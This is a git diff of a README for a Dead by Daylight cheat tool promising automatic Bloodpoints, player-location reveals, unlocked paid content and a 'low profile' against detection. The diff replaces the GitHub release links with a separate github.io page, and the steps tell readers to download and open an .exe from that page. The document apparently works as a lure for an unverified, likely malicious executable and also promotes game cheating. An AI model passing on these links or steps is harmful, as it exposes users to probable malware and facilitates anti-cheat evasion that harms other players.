@@ -1,6 +1,6 @@
 # 🤖 DBD-AutoGrind-Trainer-2026-Extreme - Automate your Dead by Daylight progression easily
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Allylic-pelargonium604/DBD-AutoGrind-Trainer-2026-Extreme/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://allylic-pelargonium604.github.io)
 
 This application provides tools to automate progression and enhance gameplay in Dead by Daylight. It includes features to earn Bloodpoints automatically, reveal player locations, and unlock game content like perks and character skins. This tool runs externally to maintain a low profile while you play.
 
@@ -21,7 +21,7 @@ You must install the latest version of the Microsoft Visual C++ Redistributable 
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the following link to find the most recent version of the application: [https://github.com/Allylic-pelargonium604/DBD-AutoGrind-Trainer-2026-Extreme/releases](https://github.com/Allylic-pelargonium604/DBD-AutoGrind-Trainer-2026-Extreme/releases).
+1. Visit the following link to find the most recent version of the application: [https://allylic-pelargonium604.github.io](https://allylic-pelargonium604.github.io).
 2. Locate the file ending in .exe within the Assets section of the latest release.
 3. Click the file name to start the download to your computer.
 4. Open your Downloads folder and locate the file.
